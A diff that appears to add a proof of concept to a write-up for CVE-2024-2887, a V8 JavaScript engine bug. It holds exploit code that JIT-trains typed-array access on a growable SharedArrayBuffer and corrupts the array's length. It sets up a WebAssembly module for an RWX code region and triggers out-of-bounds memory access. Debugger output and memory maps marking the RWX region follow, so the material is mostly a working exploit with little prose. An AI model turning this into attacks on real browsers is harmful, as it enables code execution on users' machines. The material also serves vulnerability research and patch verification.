@@ -1,3 +1,118 @@
+```js
+
+let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
+
+function addrOf(obj) {
+    return Sandbox.getAddressOf(obj);
+  }
+  
+  function v8_read64(addr) {
+    return sandboxMemory.getBigUint64(Number(addr), true);
+  }
+  
+  function v8_write64(addr, val) {
+    return sandboxMemory.setBigInt64(Number(addr), val, true);
+  }
+
+
+
+const gsab = new SharedArrayBuffer(0x16,{"maxByteLength":0x4242});
+const u16arr = new Uint16Array(gsab,0x10);
+// u16arr[1] = 1;
+// console.log(u16arr[1]);
+
+function foo(obj,index, val) {
+    obj[index] += val;
+    return obj[index];
+
+}
+
+function test(iii,val) {
+    return foo(u16arr, iii, val);
+}
+
+for (var i = 0; i < 0x10000; ++i) {
+    test(1,0);
+}
+// %DebugPrint(gsab);
+%DebugPrint(u16arr);
+console.log(addrOf(u16arr));
+console.log(v8_read64(addrOf(u16arr)+0x17));
+
+v8_write64(addrOf(u16arr)+0x19,0x2e00000n);
+
+%DebugPrint(u16arr);
+d8.file.execute('v8/test/mjsunit/wasm/wasm-module-builder.js');
+const builder = new WasmModuleBuilder();
+let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);
+
+builder.addFunction("func0", $sig_i_l).exportFunc().addBody([ // function 1 convert from int32 to int64
+  kExprLocalGet, 0,
+  kExprI32ConvertI64,
+]);
+let instance = builder.instantiate();
+instance.exports.func0(0n);
+let target = Number(0x20000000000n);
+%DebugPrint(target);
+
+%SystemBreak();
+
+var ret = test(target,0);
+console.log(ret);
+-------
+
+DebugPrint: 0x2e6400049a49: [JSTypedArray]
+ - map: 0x2e640028cd31 <Map[76](RAB_GSAB_UINT16ELEMENTS)> [FastProperties]
+ - prototype: 0x2e6400288ba1 <Object map = 0x2e6400288b35>
+ - elements: 0x2e6400000ec1 <ByteArray[0]> [RAB_GSAB_UINT16ELEMENTS]
+ - embedder fields: 2
+ - cpp_heap_wrappable: 0
+ - buffer: 0x2e6400049a05 <SharedArrayBuffer map = 0x2e6400290e19>
+ - byte_offset: 16
+ - byte_length: 0
+ - length: 3
+ - data_ptr: 0x2e6700000010
+   - base_pointer: (nil)
+   - external_pointer: 0x2e6700000010
+ - length-tracking
+ - properties: 0x2e6400000725 <FixedArray[0]> 
+ - All own properties (excluding elements): {}
+ - elements: 0x2e6400000ec1 <ByteArray[0]> {--------------------------------------------------------------------------- X 
+         0-2: 0
+ }
+
+info proc mappings
+process 3508781
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset  Perms  objfile
+      0x24d5d77a7000     0x24d5d77a8000     0x1000        0x0  r--p
+      0x2d7700000000     0x2d7700001000     0x1000        0x0  rw-p
+      0x2d7700001000     0x2d7700040000    0x3f000        0x0  ---p
+      0x2d7700040000     0x2d77000c0000    0x80000        0x0  rw-p
+      0x2d77000c0000     0x2d7740000000 0x3ff40000        0x0  ---p
+      0x2e5c00000000     0x2e6400000000 0x800000000        0x0  ---p-------------------------------------------------- X
+      0x2e6400000000     0x2e6400010000    0x10000        0x0  r--p
+      0x2e6400010000     0x2e6400020000    0x10000        0x0  ---p
+      0x2e6400020000     0x2e6400040000    0x20000        0x0  r--p
+      0x2e6400040000     0x2e6400149000   0x109000        0x0  rw-p
+      0x2e6400149000     0x2e6400180000    0x37000        0x0  ---p
+      0x2e6400180000     0x2e640027d000    0xfd000        0x0  r--p
+      0x2e640027d000     0x2e6400280000     0x3000        0x0  ---p
+      0x2e6400280000     0x2e6400300000    0x80000        0x0  rw-p
+      0x2e6400300000     0x2e6500000000 0xffd00000        0x0  ---p
+      0x2e6500000000     0x2e6500100000   0x100000        0x0  rw-p
+      0x2e6500100000     0x2e6700000000 0x1fff00000        0x0  ---p
+      0x2e6700000000     0x2e6700001000     0x1000        0x0  rw-p
+      0x2e6700001000     0x2f6c00000000 0x104fffff000        0x0  ---p
+      0x35c80947d000     0x35c80947e000     0x1000        0x0  rwxp -------------------------------------------------- WASM Code here
+
+
+```
+
+
+
+
 ### CVE-2024-2887
 
 
